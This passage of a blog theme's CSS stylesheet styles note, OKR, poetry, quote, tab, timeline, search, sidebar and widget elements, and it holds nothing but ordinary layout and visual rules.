border-top: 1px dashed var(--theme-border); border-top-left-radius: 0; border-top-right-radius: 0; } .md-text .tag-plugin.note[child=tabs] >.body { margin: 0; } .md-text .tag-plugin.note[child=tabs] >.body >.tabs { margin-top: 0.5rem; } .md-text .tag-plugin.note[child=iframe] { padding: 0; } .md-text .tag-plugin.note[child=iframe] >.body { margin: 0; } .md-text .tag-plugin.note[child=iframe] >.body iframe { margin: 0; } .md-text .tag-plugin .tag-plugin.note { --gap-p: 1rem; } .md-text .tag-plugin.okr { position: relative; border-radius: 12px; background: var(--theme-block); border: 1px solid var(--theme-border); overflow: hidden; color: var(--text-p1); line-height: 1.5; } .md-text .tag-plugin.okr .o .title { font-size: 0.9375rem; } .md-text .tag-plugin.okr .o .note { font-size: 0.875rem; } .md-text .tag-plugin.okr .o .note p { font-size: 0.875rem; } .md-text .tag-plugin.okr .kr .title { font-size: 0.875rem; } .md-text .tag-plugin.okr .kr .note { font-size: 0.875rem; } .md-text .tag-plugin.okr .kr .note p, .md-text .tag-plugin.okr .kr .note li, .md-text .tag-plugin.okr .kr .note .tag-plugin { font-size: 0.875rem; } .md-text .tag-plugin.okr .title { font-weight: 600; display: block; } .md-text .tag-plugin.okr .note { font-weight: 400; display: block; margin-top: 0.5rem; } .md-text .tag-plugin.okr .note >p, .md-text .tag-plugin.okr .note >ul { margin-top: 0.25rem; margin-bottom: 0.25rem; } .md-text .tag-plugin.okr .note >.tag-plugin { margin-top: 0.25rem; margin-bottom: 0.25rem; } .md-text .tag-plugin.okr .note >*:last-child { margin-bottom: 0; } .md-text .tag-plugin.okr .status { font-size: 0.75rem; padding: 2px 4px; border-radius: 2px; } .md-text .tag-plugin.okr .okr-item.o { border-bottom: 4px solid var(--theme-border); } .md-text .tag-plugin.okr .okr-item.kr+.okr-item.kr { border-top: 1px dashed var(--theme-border); } .tag-plugin.okr .okr-item { display: grid; grid-template-columns: 3.2rem auto 100px; grid-column-gap: 0.75rem; padding: 1rem; } .tag-plugin.okr .okr-item .okr-left .title { background: var(--card); border-radius: 1rem; text-align: center; padding: 0 0.5rem; } .tag-plugin.okr .okr-item .labels { display: flex; justify-content: space-between; align-items: flex-start; position: relative; flex-wrap: wrap; } .tag-plugin.okr .okr-item .labels .label { background: var(--theme-block); color: var(--text-p1); } .tag-plugin.okr .okr-item .progress { margin-top: 4px; height: 4px; border-radius: 2px; position: relative; background: var(--card); } .tag-plugin.okr .okr-item .progress .fill { position: absolute; background: var(--theme); border-radius: 2px; top: 0; left: 0; bottom: 0; } .tag-plugin.okr .okr-item .progress .fill:before { content: ''; position: absolute; top: -4px; bottom: -4px; right: -4px; width: 8px; height: 12px; border-radius: 8px; background: #fff; box-shadow: 0 0 2px 0px rgba(0,0,0,0.04), 0 0 8px 0px rgba(0,0,0,0.04); } .tag-plugin.okr .okr-item .progress .fill:after { content: ''; position: absolute; top: -2px; bottom: -2px; right: -2px; width: 4px; height: 8px; border-radius: 4px; background: var(--theme); } @media screen and (max-width: 667px) { .tag-plugin.okr .okr-item { grid-template-columns: 2.8rem auto 50px; grid-column-gap: 0.5rem; padding: 0.5rem; } .tag-plugin.okr .okr-item .okr-left .title { padding: 0 0.25rem; } .tag-plugin.okr .okr-item .label { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } } .tag-plugin.note blockquote, .tag-plugin.folding blockquote { border-top-left-radius: 0; border-bottom-left-radius: 0; background: none; padding-top: 0; padding-bottom: 0; } .tag-plugin.note table:not([class]) th, .tag-plugin.folding table:not([class]) th { background: var(--block-hover); } .tag-plugin.note table:not([class]) td, .tag-plugin.folding table:not([class]) td, .tag-plugin.note table:not([class]) th, .tag-plugin.folding table:not([class]) th { border-color: var(--block-border); } .md-text .tag-plugin.poetry { display: flex; flex-direction: column; align-items: center; } .md-text .tag-plugin.poetry .content >.title { font-weight: 500; margin-top: var(--gap-p); } .md-text .tag-plugin.poetry .content >.meta { color: var(--text-p2); --fsp: calc(17px - 3px); font-size: var(--fsp); font-weight: 500; } .md-text .tag-plugin.poetry .content >.meta span+span { margin-left: 4px; } .md-text .tag-plugin.poetry .content >.body { margin: var(--gap-p) 0; border-top: 1px dashed var(--block-border); border-bottom: 1px dashed var(--block-border); line-height: 2; } .md-text .tag-plugin.poetry .content >.footer { font-style: italic; color: var(--text-p4); margin: var(--gap-p) 0; --fsp: calc(17px - 3px); font-size: var(--fsp); } .md-text .tag-plugin.poetry .content { padding-left: 1rem; position: relative; } .md-text .tag-plugin.poetry .content:before { content: ''; position: absolute; width: 4px; left: -4px; top: 4px; bottom: 4px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.poetry .content >.title { position: relative; } .md-text .tag-plugin.poetry .content >.title:before { content: ''; position: absolute; width: 4px; left: calc(-1rem - 4px); top: 6px; bottom: 6px; border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.quot { text-align: center; align-items: center; display: flex; flex-direction: column; --gap-p: 2rem; margin: var(--gap-p) 1rem; } .md-text .tag-plugin.quot .content { display: flex; align-items: center; border-bottom: none; font-weight: 700; padding: 0 24px; line-height: 1.2; } @media screen and (max-width: 500px) { .md-text .tag-plugin.quot .content { padding: 0 20px; } } .md-text .tag-plugin.quot .content { position: relative; } .md-text.content .tag-plugin.quot h1, .md-text.content .tag-plugin.quot h2 { font-size: calc(17px + 11px); font-weight: 900; padding: 4px 32px 0; } @media screen and (max-width: 500px) { .md-text.content .tag-plugin.quot h1, .md-text.content .tag-plugin.quot h2 { padding: 4px 24px 0; } } .md-text.content .tag-plugin.quot h3, .md-text.content .tag-plugin.quot h4, .md-text.content .tag-plugin.quot h5, .md-text.content .tag-plugin.quot h6 { font-size: calc(17px + 7px); } .md-text.content .tag-plugin.quot p { font-size: calc(var(--fsp) + 2px); color: var(--text); } .md-text .tag-plugin.quot .content[type=text]:before, .md-text .tag-plugin.quot .content[type=text]:after { content: \"\"; position: absolute; width: 8px; height: 14px; } .md-text .tag-plugin.quot .content[type=text]:before { top: -8px; left: 0; border-top: 6px solid #ff5724; border-left: 6px solid #ff5724; } .md-text .tag-plugin.quot .content[type=text]:after { right: 0; bottom: -8px; border-right: 6px solid #ff5724; border-bottom: 6px solid #ff5724; } .md-text .tag-plugin.quot h1.content[type=text]:before, .md-text .tag-plugin.quot h1.content[type=text]:after { width: 12px; height: 20px; border-width: 8px; } .md-text .tag-plugin.quot .content[type=icon] img, .md-text .tag-plugin.quot .content[type=icon] svg { height: 1.5em; display: inline-block; color: #ff5724; border-radius: 0; flex-shrink: 0; } .md-text .tag-plugin.quot .content[type=icon] span.text { margin: 0 0.5rem; padding-top: 1px; } .md-text .tag-plugin.quot .content[type=icon] span.empty { padding: 0 8px; } .sites-wrap .grid-box { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); grid-gap: 1rem 1rem; } .sites-wrap .grid-box .grid-cell { aspect-ratio: 1.5; } .sites-wrap .site-card .card-link { width: 100%; display: flex; flex-direction: column; } .sites-wrap .site-card .card-link >img { object-fit: cover; aspect-ratio: 1.5; width: 100%; height: 100%; box-shadow: 0 1px 2px 0px rgba(0,0,0,0.2); } .sites-wrap .site-card .card-link .info { margin-top: 0.5rem; line-height: 1.2; } .sites-wrap .site-card .card-link .info >img { width: 28px; height: 28px; border-radius: 28px; float: left; margin-right: 8px; margin-top: 2px; } .sites-wrap .site-card .card-link .info span { display: block; } .sites-wrap .site-card .card-link .info .title { font-weight: 500; color: var(--text-p1); font-size: 0.875rem; margin-top: 1px; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 1; } .sites-wrap .site-card .card-link .info .desc { font-size: 10px; margin-top: 2px; word-wrap: break-word; color: var(--text-p3); display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 1; } .sites-wrap .site-card .card-link >img { transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -moz-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -webkit-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -o-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; } .sites-wrap .site-card .card-link:hover >img { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } .tag-plugin.tabs { position: relative; margin-top: 1rem; margin-bottom: 1rem; display: flex; flex-direction: column; } .tag-plugin.tabs[align=left] { align-items: flex-start; } .tag-plugin.tabs[align=left] .nav-tabs { align-self: flex-start; } .tag-plugin.tabs[align=center] { align-items: center; } .tag-plugin.tabs[align=right] { align-items: flex-end; } .tag-plugin.tabs[align=right] .nav-tabs { align-self: flex-end; } .tag-plugin.tabs .nav-tabs { display: flex; align-self: center; overflow: scroll visible; max-width: 100%; white-space: nowrap; margin: 0 !important; line-height: 1.5; position: relative; padding: 8px 0; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar { height: 0; width: 0; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar-track-piece { background: transparent; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .tag-plugin.tabs .nav-tabs:after { content: ''; position: absolute; background: var(--block-hover); width: 100%; height: 2px; bottom: 0; left: 0; border-radius: 2px; } .tag-plugin.tabs .nav-tabs .tab { list-style-type: none; } .tag-plugin.tabs .nav-tabs .tab a { display: block; cursor: pointer; padding: 0.25rem 0.75rem; --fsp: calc(17px - 3px); font-size: var(--fsp); line-height: inherit; font-weight: 500; color: var(--text-p3); border-radius: 4px; position: relative; margin: 0 2px; } .tag-plugin.tabs .nav-tabs .tab a:hover { color: var(--text-p1); background: var(--block-hover); } .tag-plugin.tabs .nav-tabs .tab a i { pointer-events: none; } .tag-plugin.tabs .nav-tabs .tab.active a { cursor: default; color: var(--text-p1); background: var(--card); box-shadow: 0 0 2px 0px rgba(0,0,0,0.04), 0 0 8px 0px rgba(0,0,0,0.04); } .tag-plugin.tabs .nav-tabs .tab.active a:after { content: ''; z-index: 1; position: absolute; background: #1cd0fd; height: 2px; bottom: -8px; left: 0.75rem; right: 0.75rem; border-radius: 2px; } .tag-plugin.tabs .tab-content { max-width: 100%; text-align: justify; margin-top: 0.5rem; } .tag-plugin.tabs .tab-content .tab-pane:not(.active) { display: none; } .tag-plugin.tabs .tab-content .tab-pane.active { display: block; } .tag-plugin.tabs .tab-content:has(.grid-box) { width: 100%; } .l_body[text-indent] .md-text .tag-plugin.tabs .tab-content .tab-pane>p:not([class]) { text-indent: calc(var(--fsp) * 2); } .l_body[text-indent] .md-text .tag-plugin.tabs .tab-content .tab-pane>p:not([class]) a { text-indent: 0; } .tag-plugin.timeline { position: relative; padding-left: 16px; } .tag-plugin.timeline:before { content: ''; position: absolute; z-index: 0; background: var(--block-hover); width: 4px; left: 0px; border-radius: 8px; top: 0.5rem; bottom: 0; } .tag-plugin.timeline:has(.loading-wrap) { padding-left: 0; } .tag-plugin.timeline:has(.loading-wrap):before { display: none; } .tag-plugin.timeline .timenode { position: relative; display: flex; flex-direction: column; align-items: flex-start; box-sizing: border-box; max-width: 100%; } .tag-plugin.timeline .timenode >.header, .tag-plugin.timeline .timenode >.body { box-sizing: border-box; max-width: 100%; } .tag-plugin.timeline .timenode[highlight] .header:before { background: #1cd0fd; } .tag-plugin.timeline .timenode+.timenode { margin-top: 1rem; } .tag-plugin.timeline .timenode:hover .header span { color: var(--text-p1); } .tag-plugin.timeline .timenode:hover .header:before { background: #1cd0fd; height: 16px; top: calc(50% - 0.5 * 16px); transform: scale(1); } .tag-plugin.timeline .timenode .header { display: flex; align-items: center; position: relative; margin: 0.25rem 0; font-size: 0.8125rem; } .tag-plugin.timeline .timenode .header a.user-info span { font-weight: 600; } .tag-plugin.timeline .timenode .header .user-info { display: flex; align-items: center; font-size: 0.8125rem; font-weight: 500; color: var(--text-p1); margin-right: 8px; line-height: 1; border-radius: 16px; } .tag-plugin.timeline .timenode .header .user-info img { background: #fff; height: 16px; border-radius: 16px; display: inline; margin: 0 4px 0 0; object-fit: contain; } .tag-plugin.timeline .timenode .header, .tag-plugin.timeline .timenode .header span { font-weight: 500; color: var(--text-p3); line-height: 1; } .tag-plugin.timeline .timenode .header:before { content: ''; position: absolute; left: -16px; width: 4px; border-radius: 12px; height: 4px; top: calc(50% - 0.5 * 4px); background: var(--text-meta); transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; -moz-transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; -webkit-transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; -o-transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; transform: scale(2); } .tag-plugin.timeline .body { background: var(--card); border-radius: 12px; border-top-left-radius: 2px; padding: 0.5rem 1rem; margin-top: 4px; box-shadow: 0 1px 4px 0px rgba(0,0,0,0.02), 0 2px 8px 0px rgba(0,0,0,0.02); } .tag-plugin.timeline .body p { --fsp: calc(17px - 1px); } .tag-plugin.timeline .body p img { display: block; } .tag-plugin.timeline .body:empty { display: none; } .tag-plugin.timeline .body p, .tag-plugin.timeline .body .highlight, .tag-plugin.timeline .body ol, .tag-plugin.timeline .body ul, .tag-plugin.timeline .body .tag-plugin { margin: 0.5rem 0; } .tag-plugin.timeline .body .tag-plugin.copy { width: 240px; } .tag-plugin.timeline[api] a.body { display: block; color: var(--text-p1); line-height: 1.25; padding: 0.75rem 1rem; --fsp: calc(17px - 1px); font-size: var(--fsp); } .tag-plugin.timeline[api] .body p.title { font-weight: 700; margin: 0.5rem 0 0.75rem; line-height: 1.25; } .tag-plugin.timeline[api] .body p.title:only-child { margin-bottom: 0.5rem; font-weight: 500; } .tag-plugin.timeline[api] .body p.title a { color: inherit; text-decoration: none; border-bottom: 2px solid #1cd0fd; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; background: none; } .tag-plugin.timeline[api] .body p.title a:hover { background: none; border-radius: 0; border-bottom: 2px solid #ff5724; } .tag-plugin.timeline[api] .body >p:first-child:not([class]) a:not([class]) { padding: 0; margin: 0; color: inherit; text-decoration: none; border-bottom: 2px solid #1cd0fd; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; background: none; } .tag-plugin.timeline[api] .body >p:first-child:not([class]) a:not([class]):hover { background: none; border-radius: 0; border-bottom: 2px solid #ff5724; } .tag-plugin.timeline[api] .body a:has(img):after { display: none; } .tag-plugin.timeline[api] .body a img { margin: 0 auto; } .tag-plugin.timeline[api] .body img { margin: 0.5rem auto; } .tag-plugin.timeline[api] .body pre code { font-size: 0.8125rem; } .tag-plugin.timeline[api] .body .footer { margin: 0 0 -0.5rem; padding: 0.5rem 0 1rem; user-select: none; font-weight: 500; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: stretch; background: var(--card); } .tag-plugin.timeline[api] .body .footer span { line-height: 1.8; } .tag-plugin.timeline[api] .body .footer:empty { display: none; } .tag-plugin.timeline[api] .body .footer .flex { display: flex; flex-wrap: wrap; font-size: 0.8125rem; align-items: stretch; } .tag-plugin.timeline[api] .body .footer .left+.right { margin-left: 4px; } .tag-plugin.timeline[api] .body .footer .item { border-width: 1px; border-style: solid; margin: 2px; border-radius: 4px; padding: 0 0.5rem; display: flex; align-items: center; border-color: #2094f3; } .tag-plugin.timeline[api] .body .footer .item:first-child { margin-left: 0; } .tag-plugin.timeline[api] .body .footer .item:last-child { margin-right: 0; } .tag-plugin.timeline[api] .body .footer a.item { background: var(--block); border-color: var(--block-border); color: inherit; } .tag-plugin.timeline[api] .body .footer a.item:hover { background: var(--block-hover); } .tag-plugin.timeline[api] .body .footer .reaction { border-color: var(--block); } .tag-plugin.timeline .body blockquote { background: none; border-radius: 0; padding: 0 0.5rem; margin: 0.75rem 0; } .tag-plugin.timeline .body blockquote p { --fsp: calc(17px - 2px); margin: 0.25rem; } .tag-plugin.timeline .body { line-height: 1.5; } .tag-plugin.timeline .body h1, .tag-plugin.timeline .body h2 { font-size: 1.25rem; margin: 1rem 0; line-height: 1.2; } .tag-plugin.timeline .body h3, .tag-plugin.timeline .body h4 { font-size: 1rem; margin: 0.75rem 0; line-height: 1.2; } .tag-plugin.timeline .body h5, .tag-plugin.timeline .body h6 { font-size: 0.9375rem; margin: 0.5rem 0; line-height: 1.2; } .tag-plugin.timeline.ds-memos .body p:first-child { margin-top: 2px; } .tag-plugin.timeline.ds-memos .body p:last-child { margin-bottom: 2px; } .tag-plugin.timeline.ds-memos .body img { margin: 0.5rem 0; max-height: 128px; cursor: zoom-in; } .tag-plugin.timeline.ds-memos .body .tag-plugin.image { display: flex; } .tag-plugin.timeline.ds-memos .body .tag-plugin.image .image-bg+.image-bg { margin-left: 4px; } details.toc { background: var(--block); border: 1px solid var(--block-border); border-radius: 12px; overflow: hidden; color: var(--text-p2); } details.toc summary { cursor: pointer; padding: 0 0.5rem; line-height: 2; color: var(--text-p2); font-size: 0.8125rem; font-weight: 500; } details.toc summary:hover { background: var(--block-hover); } details.toc >div.body { margin: var(--gap-p) 1rem 1rem; } details.toc[open] >summary { border-bottom: 1px solid transparent; } details.toc[open] >summary:hover { border-bottom-color: var(--block-border); } details.toc[open] >div.body section+section { margin-top: 1rem; } details.toc[open] >div.body section .header { line-height: 2; font-weight: 500; } details.toc[open] >div.body section .header+.doc_tree { margin-top: 0; } @media screen and (max-width: 667px) { .tag-plugin.toc[display=mobile] { display: block !important; } } .l_left footer.footer { margin: 0.5rem var(--gap-max) 1rem; } .social-wrap { display: grid; grid-gap: 0.25rem 0.25rem; grid-template-columns: repeat(auto-fill, 32px); text-align: center; } .social-wrap .social { line-height: 0; display: inline-block; padding: 6px; border-radius: 32px; filter: grayscale(100%); overflow: hidden; background: transparent; transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; -moz-transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; -webkit-transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; -o-transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; } .social-wrap .social:hover { z-index: 1; filter: unset; background: var(--alpha100); } .social-wrap .social img { border-radius: 2px; } .logo-wrap { display: flex; align-items: center; overflow: hidden; min-height: 48px; } .logo-wrap img.avatar { object-fit: cover; } .logo-wrap img.icon { object-fit: contain; } .logo-wrap .icon { width: 48px; height: 48px; margin-right: 1rem; border-radius: 4px; flex-shrink: 0; } .logo-wrap a { color: inherit; display: flex; align-items: center; } .logo-wrap a.avatar { display: block; position: relative; width: 48px; height: 48px; flex-shrink: 0; border-radius: 48px; overflow: hidden; margin-right: 1rem; } .logo-wrap a.avatar div.bg { width: 100%; height: 100%; background-size: cover; } .logo-wrap a.avatar img.avatar { margin: 2px; width: calc(100% - 2 * 2px); height: calc(100% - 2 * 2px); border-radius: calc(100% - 2 * 2px); } .logo-wrap a.avatar div.bg { transition: opacity 0.2s ease-out; -moz-transition: opacity 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out; -o-transition: opacity 0.2s ease-out; position: absolute; opacity: 0 !important; z-index: -1; } @-moz-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-webkit-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-o-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } .logo-wrap a.avatar:hover div.bg { opacity: 1 !important; animation: spin infinite 4s; animation-timing-function: linear; } .logo-wrap a.title { font-size: 1.5rem; font-weight: 900; color: inherit; line-height: 1.2; display: block; position: relative; } .logo-wrap a.title .main { color: var(--text); } .logo-wrap a.title .sub { color: var(--text-p1); transition: opacity 0.2s ease-out, transform 0.2s ease-out; -moz-transition: opacity 0.2s ease-out, transform 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out, transform 0.2s ease-out; -o-transition: opacity 0.2s ease-out, transform 0.2s ease-out; white-space: nowrap; } .logo-wrap a.title .hover { position: absolute; bottom: 0; transform: translateY(8px); overflow: visible; } .logo-wrap a.title:hover .normal { opacity: 0; transform: translateY(-8px); } .logo-wrap a.title:hover .hover { transform: translateY(0); opacity: 1 !important; } .nav-area .menu { width: 100%; display: grid; margin: 8px 0; grid-template-columns: repeat(4, 1fr); grid-gap: 8px; } .nav-area .menu::-webkit-scrollbar { display: none; } .nav-area .menu::-webkit-scrollbar-track-piece { background: transparent; } .nav-area .menu::-webkit-scrollbar-thumb { display: none; } .nav-area .menu .nav-item { box-sizing: border-box; width: 100%; min-height: 40px; border-radius: 8px; font-size: 0.9375rem; font-weight: 500; color: var(--text-p3); text-align: center; background: var(--alpha50); transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; } .nav-area .menu .nav-item img, .nav-area .menu .nav-item svg { height: 28px; object-fit: contain; filter: grayscale(100%) brightness(0.8) opacity(0.8); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } .nav-area .menu .nav-item span { text-overflow: ellipsis; word-break: keep-all; } .nav-area .menu .nav-item.active, .nav-area .menu .nav-item:hover { color: var(--text-p1); background: var(--alpha100); } .nav-area .menu .nav-item.active img, .nav-area .menu .nav-item:hover img, .nav-area .menu .nav-item.active svg, .nav-area .menu .nav-item:hover svg { filter: unset; } .nav-area .menu .nav-item.active:after { content: ''; position: absolute; width: 16px; height: 2px; left: 50%; transform: translateX(-50%); border-radius: 2px; bottom: 2px; background: currentColor; } .nav-area { margin: 32px var(--gap-margin) 0; } .search-wrapper { width: 100%; } .search-wrapper >.search-form { position: sticky; margin-bottom: 8px; top: 1rem; height: 40px; display: flex; flex-direction: row; align-items: center; transition: 0.38s ease-out; z-index: 0; border-radius: 8px; color: var(--text); background: var(--alpha50); } .search-wrapper >.search-form:has(input:focus) { background: var(--alpha100); } .search-wrapper .search-input { width: 100%; box-sizing: border-box; font-family: system-ui, \"Microsoft Yahei\", \"Segoe UI\", -apple-system, Roboto, Ubuntu, \"Helvetica Neue\", Arial, \"WenQuanYi Micro Hei\", sans-serif; font-size: 0.875rem; padding: 12px 0; color: var(--text); } .search-wrapper .search-button { border-radius: 8px; display: flex; align-items: center; height: 40px; } .search-wrapper .search-button svg { height: 1rem; width: 40px; margin-left: 4px; color: var(--text-p2); fill: currentColor; } .search-wrapper .search-button svg path[p-id=\"1562\"] { color: #1cd0fd; } .search-wrapper[searching='true'] .search-button path[p-id=\"1562\"] { color: #3dc550; } .search-wrapper.noresult[searching='true'] .search-button path[p-id=\"1562\"] { color: #f44336; } .search-wrapper .search-no-result { display: none; color: var(--text-p1); text-align: center; font-size: 0.875rem; padding: 2rem; background: var(--alpha20); border-radius: 12px; } .search-wrapper #search-result { max-height: 60vh; overflow: scroll; scrollbar-width: none; border-radius: 12px; } .search-wrapper #search-result::-webkit-scrollbar { height: 0; width: 0; } .search-wrapper #search-result::-webkit-scrollbar-track-piece { background: transparent; } .search-wrapper #search-result::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .search-wrapper #search-result::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .search-wrapper #search-result:empty { display: none; } .search-wrapper #search-result .search-result-list { padding: 0; margin: 0; list-style-type: none; } .search-wrapper #search-result li a { display: block; background: var(--alpha20); line-height: 1.2; padding: 0.75rem 1rem; border-radius: 12px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .search-wrapper #search-result li a:hover { background: var(--alpha100); } .search-wrapper #search-result li+li { margin-top: 8px; } .search-wrapper #search-result .search-result-title { color: var(--text-p1); font-weight: 700; font-size: 0.9375rem; } .search-wrapper #search-result .search-result-content { overflow: hidden; color: var(--text-p3); margin: 4px 0 0; max-height: 13em; text-align: justify; font-size: 0.8125rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .search-wrapper #search-result .search-keyword { color: #f44336; border-bottom: 1px dashed #f44336; font-weight: bold; filter: grayscale(25%); } .search-wrapper.noresult[searching='true'] .search-no-result { display: block; margin-bottom: 8px; } .l_left { margin: 8px; height: calc(100vh - 16px); border-radius: 16px; overflow: hidden; overflow: clip; overflow-clip-margin: 0.5px; } .l_left .header { margin: var(--gap-max) var(--gap-margin) 0; } .l_right { margin: 8px; border-radius: 16px; } @media screen and (min-width: 2048px) { .l_left { margin-left: auto; margin-right: calc(2 * var(--gap-max)); } .l_right { margin-left: var(--gap-max); margin-right: auto; } } .l_left { background-size: cover; background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.13/image/sidebar-bg1@small.jpg\"); } .l_left .leftbar-container { height: 100%; display: flex; flex-direction: column; word-break: break-all; text-align: justify; --blur-px: 100px; --blur-bg: var(--alpha60); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .l_left .leftbar-container { background: var(--blur-bg); backdrop-filter: saturate(240%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(240%) blur(var(--blur-px)); } } .widget-body .linklist { display: grid; grid-gap: 8px; } .linklist .link { border-radius: 8px; color: var(--text-p2); min-height: 32px; padding: 0 4px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; display: flex; justify-content: center; align-items: center; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .linklist .link.active { background: var(--alpha50); } .linklist .link.active svg, .linklist .link.active img { filter: unset; } .linklist .link span { padding: 0 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .linklist .link svg, .linklist .link img { padding: 0 2px; max-height: 18px; width: auto; filter: grayscale(100%) brightness(0.8) opacity(0.8); transition: filter 0.2s ease-out; -moz-transition: filter 0.2s ease-out; -webkit-transition: filter 0.2s ease-out; -o-transition: filter 0.2s ease-out; flex-shrink: 0; } .linklist .link svg:not([class='active-icon']), .linklist .link img:not([class='active-icon']) { color: #1cd0fd; } .widget-body .linklist.left { grid-gap: 2px; } .linklist.left .link { justify-content: space-between; padding: 0 16px; } .linklist.left .link img, .linklist.left .link svg { width: 1em; height: 1em; transform: scale(1.2); } .linklist.left .link span { padding: 0 8px; } .linklist .link:hover { background: var(--alpha100); } .linklist .link:hover svg { filter: unset; } .widget-wrapper.ghrepo .repo { display: block; padding: 0.75rem 0.5rem; color: var(--text-p2); background: var(--card); border-radius: 12px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } :root[data-theme=\"light\"] .widget-wrapper.ghrepo .repo { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .widget-wrapper.ghrepo .repo { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .widget-wrapper.ghrepo .repo:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .widget-wrapper.ghrepo .repo >div+div { margin-top: 0.5rem; } .widget-wrapper.ghrepo .repo span { color: var(--text-p2); } .widget-wrapper.ghrepo .repo svg { margin-right: 4px; } .widget-wrapper.ghrepo .repo .flex-row { display: flex; align-items: center; } .widget-wrapper.ghrepo .repo .repo-name { font-size: 0.875rem; font-weight: 700; color: var(--text-p1); } .widget-wrapper.ghrepo .repo .repo-desc { font-size: 0.8125rem; margin-left: 2px; margin-right: 2px; } .widget-wrapper.ghrepo .repo .grid { font-size: 0.8125rem; display: grid; grid-gap: 2px; grid-template-columns: repeat(auto-fill, calc((100% - 2 * 2px) / 3)); } .widget-wrapper.user-card .widget-header+.widget-body { margin: 0.75rem 0; } .widget-wrapper.user-card .widget-body { text-align: center; background: var(--card); border-radius: 12px; padding: 1rem; box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } .widgets .widget-wrapper.user-card .avatar { display: block; border-radius: 100%; margin: 1rem auto 1.25rem auto; max-width: 128px; overflow: hidden; } .widgets .widget-wrapper.user-card .avatar img { display: block; aspect-ratio: 1; } @media screen and (max-width: 768px) { .widgets .widget-wrapper.user-card .avatar { max-width: 50%; } } .widgets .widget-wrapper.user-card p.username { font-weight: 900; font-size: calc(17px + 11px); color: var(--text); margin: 0; } .widgets .widget-wrapper.user-card p.bio { font-size: 0.8125rem; margin: 0; } .widgets .widget-wrapper.user-card .follow { font-weight: 500; border-radius: 64px; margin: 1rem 0 0; padding: 0.5rem 1rem; background: #1cd0fd; color: var(--card); font-size: 1rem; align-self: stretch; text-align: center; line-height: 1.5; display: flex; align-items: center; justify-content: center; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; 